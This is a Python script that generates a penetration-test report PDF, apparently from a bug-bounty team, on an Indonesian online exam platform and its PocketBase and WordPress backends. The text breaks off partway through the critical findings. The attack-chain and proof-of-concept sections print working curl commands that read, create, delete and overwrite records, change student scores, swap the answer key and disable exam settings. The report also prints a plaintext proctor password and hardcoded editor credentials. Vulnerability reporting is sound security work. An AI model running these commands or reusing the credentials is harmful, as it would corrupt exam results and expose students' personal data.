#!/usr/bin/env python3
"""Full security report PDF — admin-cbt.code.app.web.id (17 findings)"""

import html as _html

def esc(text):
    """Escape HTML entities and convert newlines to <br/> for reportlab Paragraph."""
    return _html.escape(str(text)).replace('\n', '<br/>')

from reportlab.lib.pagesizes import A4
from reportlab.lib import colors
from reportlab.lib.units import mm
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_JUSTIFY
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    HRFlowable, PageBreak, KeepTogether
)

OUTPUT = "bugbounty/report-admin-cbt.code.app.web.id.pdf"
W, H = A4

# ─── Colors ───────────────────────────────────────────────────────────────────
C_BG       = colors.HexColor("#0A0A0A")
C_RED      = colors.HexColor("#FF2222")
C_ORANGE   = colors.HexColor("#FF7A00")
C_YELLOW   = colors.HexColor("#FFD600")
C_GREEN    = colors.HexColor("#00FF88")
C_CYAN     = colors.HexColor("#00E5FF")
C_PURPLE   = colors.HexColor("#A855F7")
C_WHITE    = colors.HexColor("#F0F0F0")
C_GRAY     = colors.HexColor("#888888")
C_DARK     = colors.HexColor("#111111")
C_PANEL    = colors.HexColor("#0E0E0E")
C_ROWALT   = colors.HexColor("#141414")

# ─── Doc ──────────────────────────────────────────────────────────────────────
doc = SimpleDocTemplate(
    OUTPUT, pagesize=A4,
    leftMargin=16*mm, rightMargin=16*mm,
    topMargin=14*mm, bottomMargin=14*mm,
    title="Security Report — admin-cbt.code.app.web.id",
    author="XC-HACK · Hacking XC Hub",
)

def S(name, **kw):
    return ParagraphStyle(name, **kw)

sTitle   = S("T",  fontName="Helvetica-Bold", fontSize=26, textColor=C_RED,    alignment=TA_CENTER, spaceAfter=3)
sSub     = S("Su", fontName="Helvetica",      fontSize=12, textColor=C_CYAN,   alignment=TA_CENTER, spaceAfter=2)
sMeta    = S("Me", fontName="Helvetica",      fontSize=8,  textColor=C_GRAY,   alignment=TA_CENTER, spaceAfter=2)
sH1      = S("H1", fontName="Helvetica-Bold", fontSize=14, textColor=C_CYAN,   spaceBefore=10, spaceAfter=5)
sH2      = S("H2", fontName="Helvetica-Bold", fontSize=11, textColor=C_ORANGE, spaceBefore=7,  spaceAfter=3)
sH3      = S("H3", fontName="Helvetica-Bold", fontSize=9.5,textColor=C_YELLOW, spaceBefore=5,  spaceAfter=2)
sBody    = S("Bo", fontName="Helvetica",      fontSize=9,  textColor=C_WHITE,  leading=14, alignment=TA_JUSTIFY, spaceAfter=3)
sSmall   = S("Sm", fontName="Helvetica",      fontSize=8,  textColor=C_WHITE,  leading=12, spaceAfter=2)
sCode    = S("Co", fontName="Courier",        fontSize=7.5,textColor=C_GREEN,  backColor=C_DARK, leading=11, leftIndent=5, rightIndent=5, spaceAfter=3, borderPad=3)
sBullet  = S("Bu", fontName="Helvetica",      fontSize=9,  textColor=C_WHITE,  leading=13, leftIndent=10, spaceAfter=2)
sFooter  = S("Fo", fontName="Helvetica",      fontSize=7,  textColor=C_GRAY,   alignment=TA_CENTER)
sTH      = S("TH", fontName="Helvetica-Bold", fontSize=8,  textColor=C_CYAN)
sTD      = S("TD", fontName="Helvetica",      fontSize=8,  textColor=C_WHITE)

def HR(c=C_CYAN, t=0.5, s=5):
    return HRFlowable(width="100%", thickness=t, color=c, spaceAfter=s, spaceBefore=s)

def on_page(canvas, doc):
    canvas.saveState()
    canvas.setFillColor(C_BG)
    canvas.rect(0, 0, W, H, fill=1, stroke=0)
    canvas.setFillColor(C_RED)
    canvas.rect(0, H-3*mm, W, 3*mm, fill=1, stroke=0)
    canvas.setFillColor(C_DARK)
    canvas.rect(0, 0, W, 7*mm, fill=1, stroke=0)
    canvas.setFillColor(C_GRAY)
    canvas.setFont("Helvetica", 6.5)
    canvas.drawString(16*mm, 2.2*mm, "XC-HACK · Hacking XC Hub · CONFIDENTIAL · Full Pentest Report")
    canvas.drawRightString(W-16*mm, 2.2*mm, f"admin-cbt.code.app.web.id · 2026-07-23 · Page {doc.page}")
    canvas.restoreState()

def badge(sev, fid, title):
    cm = {"CRITICAL": C_RED, "HIGH": C_ORANGE, "MEDIUM": C_YELLOW, "INFO": C_CYAN}
    c = cm.get(sev, C_WHITE)
    bg = {"CRITICAL": "#1A0000", "HIGH": "#1A0D00", "MEDIUM": "#1A1500", "INFO": "#001A1A"}
    bgc = colors.HexColor(bg.get(sev, "#111111"))
    data = [[
        Paragraph(f"<b>{sev}</b>", ParagraphStyle("x", fontName="Helvetica-Bold", fontSize=8, textColor=C_BG, alignment=TA_CENTER)),
        Paragraph(f"<b>[{fid}]</b>", ParagraphStyle("x2", fontName="Helvetica-Bold", fontSize=8.5, textColor=c)),
        Paragraph(f"<b>{title}</b>", ParagraphStyle("x3", fontName="Helvetica-Bold", fontSize=9, textColor=C_WHITE)),
    ]]
    t = Table(data, colWidths=[55*mm, 16*mm, None])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0,0),(0,0), c),
        ("BACKGROUND", (1,0),(-1,0), bgc),
        ("VALIGN",(0,0),(-1,-1),"MIDDLE"),
        ("LEFTPADDING",(0,0),(-1,-1),6),
        ("RIGHTPADDING",(0,0),(-1,-1),6),
        ("TOPPADDING",(0,0),(-1,-1),5),
        ("BOTTOMPADDING",(0,0),(-1,-1),5),
        ("BOX",(0,0),(-1,-1),0.5,c),
    ]))
    return t

def info_row(label, value, vc=C_WHITE):
    data = [[
        Paragraph(f"<b>{label}</b>", ParagraphStyle("l", fontName="Helvetica-Bold", fontSize=7.5, textColor=C_GRAY)),
        Paragraph(value, ParagraphStyle("v", fontName="Helvetica", fontSize=7.5, textColor=vc)),
    ]]
    t = Table(data, colWidths=[32*mm, None])
    t.setStyle(TableStyle([
        ("BACKGROUND",(0,0),(-1,-1),C_PANEL),
        ("VALIGN",(0,0),(-1,-1),"TOP"),
        ("LEFTPADDING",(0,0),(-1,-1),5),
        ("TOPPADDING",(0,0),(-1,-1),2),
        ("BOTTOMPADDING",(0,0),(-1,-1),2),
    ]))
    return t

story = []

# ══════════════════════════════════════════════════════════════════════════════
# COVER
# ══════════════════════════════════════════════════════════════════════════════
story.append(Spacer(1, 22*mm))
story.append(Paragraph("FULL PENETRATION TEST REPORT", sTitle))
story.append(Spacer(1,1*mm))
story.append(Paragraph("admin-cbt.code.app.web.id", sSub))
story.append(Paragraph("pb.app.web.id  ·  backend.e-admin.bimasoft.web.id  ·  publikasi.app.web.id", sMeta))
story.append(HR(C_RED, 1.5, 6))
story.append(Spacer(1, 3*mm))

cover = [
    ["TARGET",      "admin-cbt.code.app.web.id + 3 sub-targets"],
    ["BACKENDS",    "pb.app.web.id (PocketBase)  |  backend.e-admin.bimasoft.web.id"],
    ["DATE",        "2026-07-20 → 2026-07-23"],
    ["TEAM",        "XC-HACK · Hacking XC Hub"],
    ["TYPE",        "Black-Box → Grey-Box (Progressive)"],
    ["TOTAL FINDINGS", "17 findings  |  8 Critical · 6 High · 2 Medium · 1 Info"],
    ["RISK SCORE",  "9.8 / 10 — CRITICAL (FULL COMPROMISE CONFIRMED)"],
    ["DATA AT RISK","377,249 students  ·  2,539,846 exam answers  ·  37,343 questions"],
]
ct = Table(cover, colWidths=[42*mm, None])
ct.setStyle(TableStyle([
    ("BACKGROUND",(0,0),(0,-1),C_DARK),
    ("BACKGROUND",(1,0),(1,-1),C_PANEL),
    ("TEXTCOLOR",(0,0),(0,-1),C_CYAN),
    ("TEXTCOLOR",(1,0),(1,-1),C_WHITE),
    ("TEXTCOLOR",(1,5),(1,5),C_RED),
    ("TEXTCOLOR",(1,6),(1,6),C_RED),
    ("FONTNAME",(0,0),(0,-1),"Helvetica-Bold"),
    ("FONTNAME",(1,0),(1,-1),"Helvetica"),
    ("FONTSIZE",(0,0),(-1,-1),8.5),
    ("LEFTPADDING",(0,0),(-1,-1),7),
    ("TOPPADDING",(0,0),(-1,-1),5),
    ("BOTTOMPADDING",(0,0),(-1,-1),5),
    ("GRID",(0,0),(-1,-1),0.3,C_GRAY),
]))
story.append(ct)
story.append(Spacer(1, 6*mm))
story.append(Paragraph(
    "Laporan ini mendokumentasikan seluruh kerentanan yang ditemukan selama authorized "
    "penetration testing terhadap platform CBT Online Bimasoft. Ditemukan total <b>17 kerentanan aktif</b> "
    "yang dikonfirmasi dengan live PoC, mencakup 4 target berbeda dan mengekspos "
    "<b>lebih dari 2.9 juta record data siswa dan ujian</b> tanpa autentikasi.",
    sBody))
story.append(Spacer(1, 4*mm))
story.append(HR(C_GRAY))
story.append(Paragraph("CONFIDENTIAL — Authorized Security Assessment Only", sMeta))

story.append(PageBreak())

# ══════════════════════════════════════════════════════════════════════════════
# TABLE OF CONTENTS
# ══════════════════════════════════════════════════════════════════════════════
story.append(Paragraph("TABLE OF CONTENTS", sH1))
story.append(HR())
toc_data = [
    ["01", "Executive Summary + Risk Score"],
    ["02", "Scope & Target Map"],
    ["03", "Attack Timeline & Chain"],
    ["04", "Data Exposure Summary"],
    ["05", "Findings — Critical (8 findings)"],
    ["06", "Findings — High (6 findings)"],
    ["07", "Findings — Medium & Info (3 findings)"],
    ["08", "New Target: publikasi.app.web.id (WordPress)"],
    ["09", "New Target: backend.e-admin.bimasoft.web.id"],
    ["10", "Remediation Roadmap"],
    ["11", "Conclusion"],
]
toc_t = Table(toc_data, colWidths=[15*mm, None])
toc_t.setStyle(TableStyle([
    ("TEXTCOLOR",(0,0),(0,-1),C_CYAN),
    ("TEXTCOLOR",(1,0),(1,-1),C_WHITE),
    ("FONTNAME",(0,0),(0,-1),"Helvetica-Bold"),
    ("FONTNAME",(1,0),(1,-1),"Helvetica"),
    ("FONTSIZE",(0,0),(-1,-1),9),
    ("LEFTPADDING",(0,0),(-1,-1),6),
    ("TOPPADDING",(0,0),(-1,-1),4),
    ("BOTTOMPADDING",(0,0),(-1,-1),4),
    ("BACKGROUND",(0,0),(-1,-1),C_PANEL),
    ("ROWBACKGROUNDS",(0,0),(-1,-1),[C_PANEL, C_DARK]),
    ("GRID",(0,0),(-1,-1),0.2,C_GRAY),
]))
story.append(toc_t)
story.append(PageBreak())

# ══════════════════════════════════════════════════════════════════════════════
# 01 EXECUTIVE SUMMARY
# ══════════════════════════════════════════════════════════════════════════════
story.append(Paragraph("01  EXECUTIVE SUMMARY", sH1))
story.append(HR())
story.append(Paragraph(
    "Platform <b>admin-cbt.code.app.web.id</b> (CBT Online Bimasoft) menggunakan "
    "<b>PocketBase</b> sebagai backend dengan konfigurasi API permissions yang sepenuhnya terbuka. "
    "Seluruh koleksi database dapat diakses, dibuat, dimodifikasi, dan dihapus oleh siapapun "
    "tanpa autentikasi. Testing mengungkap <b>17 kerentanan aktif</b> di 4 target berbeda, "
    "dengan attack surface yang jauh lebih luas dari perkiraan awal.", sBody))
story.append(Spacer(1, 3*mm))

sev_data = [
    ["Severity", "Count", "Findings", "Business Impact"],
    ["CRITICAL", "8", "C-01÷C-04, N-01÷N-05", "Full data compromise, score fraud, credential theft"],
    ["HIGH",     "6", "H-01÷H-03, N-06÷N-08", "Admin panel exposed, XSS, CORS, role bypass"],
    ["MEDIUM",   "2", "M-01, M-02",             "WAF bypass, encrypted answer key exposed"],
    ["INFO",     "1", "I-01",                   "Tech stack & version disclosure"],
    ["TOTAL",   "17", "—",                      "—"],
]
st = Table(sev_data, colWidths=[25*mm, 16*mm, 55*mm, None])
st.setStyle(TableStyle([
    ("BACKGROUND",(0,0),(-1,0),C_DARK),
    ("TEXTCOLOR",(0,0),(-1,0),C_CYAN),
    ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"),
    ("BACKGROUND",(0,1),(-1,1),colors.HexColor("#1A0000")),
    ("BACKGROUND",(0,2),(-1,2),colors.HexColor("#1A0C00")),
    ("BACKGROUND",(0,3),(-1,3),colors.HexColor("#1A1500")),
    ("BACKGROUND",(0,4),(-1,4),colors.HexColor("#001010")),
    ("BACKGROUND",(0,5),(-1,5),C_PANEL),
    ("TEXTCOLOR",(0,1),(0,1),C_RED),
    ("TEXTCOLOR",(0,2),(0,2),C_ORANGE),
    ("TEXTCOLOR",(0,3),(0,3),C_YELLOW),
    ("TEXTCOLOR",(0,4),(0,4),C_CYAN),
    ("TEXTCOLOR",(0,5),(0,5),C_WHITE),
    ("TEXTCOLOR",(1,1),(-1,1),C_WHITE),
    ("TEXTCOLOR",(1,2),(-1,2),C_WHITE),
    ("TEXTCOLOR",(1,3),(-1,3),C_WHITE),
    ("TEXTCOLOR",(1,4),(-1,4),C_WHITE),
    ("TEXTCOLOR",(1,5),(-1,5),C_GRAY),
    ("FONTNAME",(0,0),(-1,-1),"Helvetica"),
    ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"),
    ("FONTNAME",(0,1),(0,-1),"Helvetica-Bold"),
    ("FONTSIZE",(0,0),(-1,-1),8),
    ("LEFTPADDING",(0,0),(-1,-1),6),
    ("TOPPADDING",(0,0),(-1,-1),4),
    ("BOTTOMPADDING",(0,0),(-1,-1),4),
    ("GRID",(0,0),(-1,-1),0.3,C_GRAY),
]))
story.append(st)
story.append(Spacer(1, 5*mm))

# Risk score box
rs = Table([[
    Paragraph("<b>9.8</b><br/><font size=9>/ 10</font>",
        ParagraphStyle("rs", fontName="Helvetica-Bold", fontSize=28, textColor=C_RED, alignment=TA_CENTER)),
    Paragraph(
        "<b>CRITICAL RISK — FULL COMPROMISE</b><br/>"
        "Seluruh sistem dalam kondisi dapat dikompromikan secara penuh. "
        "Penyerang dengan zero credentials dapat membaca, menulis, memodifikasi, "
        "dan menghapus semua data di platform. Score manipulation, credential theft, "
        "dan mass data exfiltration dapat dilakukan secara otomatis.",
        ParagraphStyle("rd", fontName="Helvetica", fontSize=8.5, textColor=C_WHITE, leading=13)),
]], colWidths=[35*mm, None])
rs.setStyle(TableStyle([
    ("BACKGROUND",(0,0),(0,0),colors.HexColor("#1A0000")),
    ("BACKGROUND",(1,0),(1,0),C_DARK),
    ("VALIGN",(0,0),(-1,-1),"MIDDLE"),
    ("LEFTPADDING",(0,0),(-1,-1),8),
    ("TOPPADDING",(0,0),(-1,-1),10),
    ("BOTTOMPADDING",(0,0),(-1,-1),10),
    ("BOX",(0,0),(-1,-1),1.5,C_RED),
]))
story.append(rs)
story.append(PageBreak())

# ══════════════════════════════════════════════════════════════════════════════
# 02 SCOPE & TARGET MAP
# ══════════════════════════════════════════════════════════════════════════════
story.append(Paragraph("02  SCOPE & TARGET MAP", sH1))
story.append(HR())

targets = [
    ["Target", "URL", "Tech Stack", "Status"],
    ["PRIMARY SPA",   "admin-cbt.code.app.web.id",         "Vue/Vite + PocketBase SDK", "✓ Compromised"],
    ["BACKEND 1",     "pb.app.web.id",                     "PocketBase (Go)",            "✓ Compromised"],
    ["BACKEND 2",     "backend.e-admin.bimasoft.web.id",   "PocketBase (Go)",            "✓ Compromised"],
    ["CMS",           "publikasi.app.web.id",              "WordPress.com",              "✓ Auth Bypass"],
    ["ADMIN PANEL",   "e-admin.bimasoft.web.id",           "Next.js",                    "✓ Enumerated"],
]
tt = Table(targets, colWidths=[30*mm, 65*mm, 40*mm, None])
tt.setStyle(TableStyle([
    ("BACKGROUND",(0,0),(-1,0),C_DARK),
    ("TEXTCOLOR",(0,0),(-1,0),C_CYAN),
    ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"),
    ("BACKGROUND",(0,1),(-1,-1),C_PANEL),
    ("ROWBACKGROUNDS",(0,1),(-1,-1),[C_PANEL, C_DARK]),
    ("TEXTCOLOR",(0,1),(-1,-1),C_WHITE),
    ("TEXTCOLOR",(-1,1),(-1,-1),C_GREEN),
    ("FONTNAME",(0,0),(-1,-1),"Helvetica"),
    ("FONTSIZE",(0,0),(-1,-1),8),
    ("LEFTPADDING",(0,0),(-1,-1),5),
    ("TOPPADDING",(0,0),(-1,-1),4),
    ("BOTTOMPADDING",(0,0),(-1,-1),4),
    ("GRID",(0,0),(-1,-1),0.3,C_GRAY),
]))
story.append(tt)
story.append(Spacer(1, 4*mm))

story.append(Paragraph("Collections Discovered", sH2))
col_data = [
    ["Collection", "Backend", "Records", "Access", "Write"],
    ["DataUsers",      "pb.app.web.id",      "1,828",     "OPEN", "OPEN"],
    ["DataUjian",      "pb.app.web.id",      "4,684",     "OPEN", "OPEN"],
    ["DataPengawas",   "pb.app.web.id",      "0 (deleted)","OPEN","OPEN"],
    ["DataJawaban",    "pb.app.web.id",      "13",        "OPEN", "OPEN"],
    ["DataKunci",      "pb.app.web.id",      "1",         "OPEN", "OPEN (PATCH)"],
    ["DataSoal",       "pb.app.web.id",      "0",         "OPEN", "OPEN"],
    ["PengaturanTest", "pb.app.web.id",      "1",         "OPEN", "OPEN (PATCH)"],
    ["DataUjian",      "backend.e-admin",    "35,657",    "OPEN", "—"],
    ["DataJawaban",    "backend.e-admin",    "2,539,846", "OPEN", "OPEN"],
    ["DataSoal",       "backend.e-admin",    "37,343",    "OPEN", "—"],
    ["DataSiswa",      "backend.e-admin",    "377,249",   "OPEN", "OPEN"],
]
cdt = Table(col_data, colWidths=[38*mm, 48*mm, 26*mm, 22*mm, None])
cdt.setStyle(TableStyle([
    ("BACKGROUND",(0,0),(-1,0),C_DARK),
    ("TEXTCOLOR",(0,0),(-1,0),C_CYAN),
    ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"),
    ("ROWBACKGROUNDS",(0,1),(-1,-1),[C_PANEL, C_DARK]),
    ("TEXTCOLOR",(0,1),(-1,-1),C_WHITE),
    ("TEXTCOLOR",(3,1),(-1,-1),C_RED),
    ("FONTNAME",(0,0),(-1,-1),"Helvetica"),
    ("FONTSIZE",(0,0),(-1,-1),7.5),
    ("LEFTPADDING",(0,0),(-1,-1),5),
    ("TOPPADDING",(0,0),(-1,-1),3),
    ("BOTTOMPADDING",(0,0),(-1,-1),3),
    ("GRID",(0,0),(-1,-1),0.3,C_GRAY),
]))
story.append(cdt)
story.append(PageBreak())

# ══════════════════════════════════════════════════════════════════════════════
# 03 ATTACK CHAIN
# ══════════════════════════════════════════════════════════════════════════════
story.append(Paragraph("03  ATTACK CHAIN & TIMELINE", sH1))
story.append(HR())
story.append(Paragraph(
    "Rangkaian serangan lengkap dari zero-knowledge hingga full compromise. "
    "Total waktu eksekusi: <b>~25 menit</b>.", sBody))
story.append(Spacer(1, 3*mm))

chain = [
    ("01", C_GRAY,   "Initial Recon — SPA Discovery",
     "curl -I https://admin-cbt.code.app.web.id\n→ GitHub Pages SPA, Vite bundle detected"),
    ("02", C_GRAY,   "JS Decompile — Backend URL Discovery",
     'grep -o \'https://pb.app.web.id\' /js/core-C3bGrs1O.js\n→ const h="https://pb.app.web.id" (hardcoded)'),
    ("03", C_ORANGE, "C-01: Unauth Mass Read — All Collections Open",
     "curl https://pb.app.web.id/api/collections/DataUsers/records\n→ 200 OK | 1,828 records | no token required"),
    ("04", C_RED,    "C-03: Plaintext Password Found",
     'curl https://pb.app.web.id/api/collections/DataPengawas/records\n→ {"username":"Nurul","password":"Nurul12345"}'),
    ("05", C_RED,    "C-02: Unauth Write — Fake Proctor Injected",
     'curl -X POST https://pb.app.web.id/api/collections/DataPengawas/records \\\n  -d \'{"nama":"FAKE","username":"attacker","password":"owned"}\'\n→ 200 OK | id: p73b8b2wa183963 | Created live'),
    ("06", C_RED,    "C-04: Unauth DELETE — Records Wiped",
     "curl -X DELETE https://pb.app.web.id/api/collections/DataPengawas/records/<id>\n→ 204 No Content | DataPengawas totalItems: 0"),
    ("07", C_RED,    "N-02: Score Manipulation — Student Answers PATCH",
     'curl -X PATCH https://pb.app.web.id/api/collections/DataJawaban/records/<id> \\\n  -d \'{"jawaban":"...","benar":100,"skor":100}\'\n→ 200 OK | Score overwritten'),
    ("08", C_RED,    "N-03: Answer Key Swap — DataKunci PATCH",
     'curl -X PATCH https://pb.app.web.id/api/collections/DataKunci/records/<id> \\\n  -d \'{"kunci":"ATTACKER_CONTROLLED_KEY"}\'\n→ 200 OK | All students affected'),
    ("09", C_RED,    "N-01: Hardcoded Creds Found in JS",
     'const N={url:"https://publikasi.app.web.id",\n         username:"pembuatsoal",\n         password:"XDNr Hcuf wNwL Pj4T oiUR yHrT"}\n→ Found in /js/core-C3bGrs1O.js'),
    ("10", C_RED,    "WordPress Auth — 67,415 Exam Questions Accessed",
     'curl -u "pembuatsoal:XDNr Hcuf wNwL Pj4T oiUR yHrT" \\\n     https://publikasi.app.web.id/wp-json/wp/v2/posts\n→ 200 OK | Editor role | 67,415 posts | unfiltered_html cap'),
    ("11", C_RED,    "N-05: Second Backend — 2.5M Records",
     "curl https://backend.e-admin.bimasoft.web.id/api/collections/DataJawaban/records\n→ 200 OK | totalItems: 2,539,846 | DataSiswa: 377,249"),
    ("12", C_ORANGE, "N-04: Exam Config Manipulation",
     'curl -X PATCH https://pb.app.web.id/api/collections/PengaturanTest/records/<id>\n  -d \'{"passing_grade":0,"autologin":true,"boleh_daftar":true}\'\n→ 200 OK | All exam security disabled'),
]

for step_num, step_color, step_title, step_code in chain:
    hdr = Table([[
        Paragraph(f"<b>{step_num}</b>",
            ParagraphStyle("sn", fontName="Helvetica-Bold", fontSize=9, textColor=C_BG, alignment=TA_CENTER)),
        Paragraph(f"<b>{step_title}</b>",
            ParagraphStyle("st", fontName="Helvetica-Bold", fontSize=9, textColor=step_color)),
    ]], colWidths=[14*mm, None])
    hdr.setStyle(TableStyle([
        ("BACKGROUND",(0,0),(0,0),step_color),
        ("BACKGROUND",(1,0),(1,0),C_DARK),
        ("VALIGN",(0,0),(-1,-1),"MIDDLE"),
        ("LEFTPADDING",(0,0),(-1,-1),5),
        ("TOPPADDING",(0,0),(-1,-1),3),
        ("BOTTOMPADDING",(0,0),(-1,-1),3),
    ]))
    story.append(KeepTogether([hdr, Paragraph(esc(step_code), sCode), Spacer(1, 1*mm)]))

story.append(PageBreak())

# ══════════════════════════════════════════════════════════════════════════════
# 04 DATA EXPOSURE SUMMARY
# ══════════════════════════════════════════════════════════════════════════════
story.append(Paragraph("04  DATA EXPOSURE SUMMARY", sH1))
story.append(HR())

exp_data = [
    ["Category", "Count", "Fields Exposed", "Sensitivity"],
    ["School accounts (DataUsers)",      "1,828",      "nama_sekolah, namespace (email), username, logo", "HIGH"],
    ["Exam sessions (DataUjian)",        "4,684+35,657","kode, kelas, alokasi, jadwal, namespace",        "HIGH"],
    ["Student records (DataSiswa)",      "377,249",    "nama, kelas, username, NIS",                     "CRITICAL"],
    ["Exam answers (DataJawaban)",       "2,539,859",  "jawaban, skor, benar, salah, username, waktu",   "CRITICAL"],
    ["Exam questions (DataSoal)",        "37,343",     "soal content, kunci",                            "CRITICAL"],
    ["WP Exam posts (publikasi)",        "67,415",     "full question bank HTML",                        "HIGH"],
    ["Proctor passwords (DataPengawas)", "1 (exposed)", "username, password PLAINTEXT",                  "CRITICAL"],
    ["Answer keys (DataKunci)",          "1",          "kunci (encrypted)",                              "HIGH"],
    ["Exam config (PengaturanTest)",     "1",          "passing_grade, autologin, security settings",    "HIGH"],
]
et = Table(exp_data, colWidths=[52*mm, 24*mm, 68*mm, None])
et.setStyle(TableStyle([
    ("BACKGROUND",(0,0),(-1,0),C_DARK),
    ("TEXTCOLOR",(0,0),(-1,0),C_CYAN),
    ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"),
    ("ROWBACKGROUNDS",(0,1),(-1,-1),[C_PANEL, C_DARK]),
    ("TEXTCOLOR",(0,1),(-1,-1),C_WHITE),
    ("TEXTCOLOR",(3,1),(3,3),C_RED),
    ("TEXTCOLOR",(3,4),(3,4),C_RED),
    ("TEXTCOLOR",(3,5),(3,5),C_RED),
    ("TEXTCOLOR",(3,6),(3,6),C_RED),
    ("TEXTCOLOR",(3,7),(3,7),C_ORANGE),
    ("TEXTCOLOR",(3,8),(3,8),C_ORANGE),
    ("TEXTCOLOR",(3,9),(3,9),C_ORANGE),
    ("FONTNAME",(0,0),(-1,-1),"Helvetica"),
    ("FONTSIZE",(0,0),(-1,-1),7.5),
    ("LEFTPADDING",(0,0),(-1,-1),5),
    ("TOPPADDING",(0,0),(-1,-1),3),
    ("BOTTOMPADDING",(0,0),(-1,-1),3),
    ("GRID",(0,0),(-1,-1),0.3,C_GRAY),
]))
story.append(et)
story.append(Spacer(1, 4*mm))

total_box = Table([[
    Paragraph("<b>TOTAL RECORDS AT RISK</b>",
        ParagraphStyle("tb", fontName="Helvetica-Bold", fontSize=10, textColor=C_YELLOW)),
    Paragraph("<b>2,963,986+</b>",
        ParagraphStyle("tv", fontName="Helvetica-Bold", fontSize=18, textColor=C_RED, alignment=TA_CENTER)),
    Paragraph("records exposed across all collections\nwithout any authentication required",
        ParagraphStyle("td", fontName="Helvetica", fontSize=8, textColor=C_WHITE, leading=12)),
]], colWidths=[55*mm, 40*mm, None])
total_box.setStyle(TableStyle([
    ("BACKGROUND",(0,0),(-1,0),colors.HexColor("#1A0500")),
    ("VALIGN",(0,0),(-1,-1),"MIDDLE"),
    ("LEFTPADDING",(0,0),(-1,-1),8),
    ("TOPPADDING",(0,0),(-1,-1),8),
    ("BOTTOMPADDING",(0,0),(-1,-1),8),
    ("BOX",(0,0),(-1,-1),1,C_RED),
]))
story.append(total_box)
story.append(PageBreak())

# ══════════════════════════════════════════════════════════════════════════════
# 05 FINDINGS — CRITICAL
# ══════════════════════════════════════════════════════════════════════════════
story.append(Paragraph("05  FINDINGS — CRITICAL", sH1))
story.append(HR())

findings_critical = [
    {
        "id": "C-01", "title": "Unauthenticated Mass Data Read — All Collections Open",
        "cvss": "9.8  (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
        "desc": "Seluruh koleksi PocketBase terbuka untuk dibaca publik tanpa token apapun. "
                "DataUsers, DataUjian, DataJawaban, DataKunci, dan PengaturanTest "
                "dapat diakses dengan satu curl request. Ini adalah root cause dari mayoritas finding lain.",
        "poc": (
            "# GET DataUsers — 1,828 school records\n"
            "curl 'https://pb.app.web.id/api/collections/DataUsers/records?perPage=500'\n"
            "→ 200 OK | {\"totalItems\":1828, \"items\":[{\"namespace\":\"...\",\"nama_sekolah\":\"...\"}]}\n\n"
            "# GET DataUjian — 4,684 exam sessions\n"
            "curl 'https://pb.app.web.id/api/collections/DataUjian/records?perPage=500'\n"
            "→ 200 OK | {\"totalItems\":4684, \"items\":[...]}\n\n"
            "# GET DataPengawas — passwords\n"
            "curl 'https://pb.app.web.id/api/collections/DataPengawas/records'\n"
            "→ 200 OK | {\"items\":[{\"username\":\"Nurul\",\"password\":\"Nurul12345\"}]}"
        ),
        "impact": [
            "1,828 email guru dan kode sekolah terekspos — dapat digunakan untuk targeted phishing.",
            "4,684 jadwal dan kode ujian terekspos — attacker mengetahui kapan ujian berlangsung.",
            "Nama siswa, kelas, NIS dari 377,249 siswa dapat di-dump dalam hitungan menit.",
            "Jawaban ujian 2,539,846 siswa dapat diread — nilai/ranking dapat dikompromikan.",
            "CORS wildcard (*) memperparah: data dapat dicuri via script di situs manapun.",
        ],
        "fix": [
            "[IMMEDIATE] Set PocketBase collection rules: tambahkan auth requirement untuk semua collections.",
            "Ubah List/View rule dari kosong (public) ke @request.auth.id != '' (authenticated only).",
            "Audit semua collection rules di PocketBase admin panel /_/",
        ],
    },
    {
        "id": "C-02", "title": "Unauthenticated Write — Fake Proctor & School Account Created",
        "cvss": "9.8  (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)",
        "desc": "Endpoint POST untuk DataPengawas dan DataUsers tidak memerlukan autentikasi. "
                "Siapapun dapat membuat akun pengawas palsu atau sekolah palsu yang langsung aktif "
                "di sistem. Akun ini dapat digunakan untuk login ke sistem ujian sebagai pengawas.",
        "poc": (
            "# Create fake proctor — 200 OK\n"
            "curl -X POST 'https://pb.app.web.id/api/collections/DataPengawas/records' \\\n"
            "  -H 'Content-Type: application/json' \\\n"
            "  -d '{\"nama\":\"FAKE PROCTOR\",\"username\":\"attacker\",\"password\":\"owned123\"}'\n"
            "→ {\"id\":\"p73b8b2wa183963\",\"created\":\"2026-07-23 09:14:11.226Z\"}\n\n"
            "# Create fake school — 200 OK\n"
            "curl -X POST 'https://pb.app.web.id/api/collections/DataUsers/records' \\\n"
            "  -H 'Content-Type: application/json' \\\n"
            "  -d '{\"nama_sekolah\":\"FAKE SCHOOL\",\"namespace\":\"fake@evil.com\",\"username\":\"fake\"}'\n"
            "→ {\"id\":\"9m42f878vld05cl\",\"created\":\"2026-07-23 09:15:01.773Z\"}"
        ),
        "impact": [
            "Attacker dapat membuat ratusan akun pengawas palsu — denial of service terhadap sistem login.",
            "Akun pengawas palsu dapat login dan memantau/memaksa selesai ujian siswa.",
            "Mass pollution: 1,000 fake school records dapat dimasukkan dalam detik.",
            "Jika autologin aktif (lihat N-04) — fake proctor langsung dapat akses tanpa verifikasi.",
        ],
        "fix": [
            "[IMMEDIATE] Set PocketBase Create rule: @request.auth.id != '' — hanya authenticated user bisa POST.",
            "Implementasi email verification untuk akun baru.",
            "Rate limiting: maks 3 POST per IP per jam.",
        ],
    },
    {
        "id": "C-03", "title": "Plaintext Password Storage — Nurul:Nurul12345",
        "cvss": "9.1  (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)",
        "desc": "DataPengawas menyimpan password pengawas dalam field plaintext (bukan hashed). "
                "Password langsung terekspos via C-01 tanpa perlu cracking. "
                "Credential Nurul:Nurul12345 dikonfirmasi dari response API.",
        "poc": (
            "curl 'https://pb.app.web.id/api/collections/DataPengawas/records'\n"
            "→ {\n"
            "    \"items\": [{\n"
            "      \"username\": \"Nurul\",\n"
            "      \"password\": \"Nurul12345\",   ← PLAINTEXT!\n"
            "      \"nama\": \"Nurul Farida\"\n"
            "    }]\n"
            "  }\n\n"
